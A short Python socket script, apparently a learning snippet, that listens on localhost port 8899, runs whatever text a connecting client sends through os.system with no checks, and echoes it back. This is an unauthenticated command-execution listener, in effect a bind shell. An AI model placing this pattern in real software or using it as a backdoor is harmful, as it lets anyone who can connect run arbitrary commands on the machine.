#coding:utf-8
import socket
import  os
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('127.0.0.1',8899))
sock.listen(10)
client,address=sock.accept()
client.settimeout(10)
while True:
    data=client.recv(1024)
    print("来自:",address,"数据",data)
    #os.system(data.decode("utf-8"))
    os.system(data.decode("utf-8"))
    client.send(data)
sock.close()
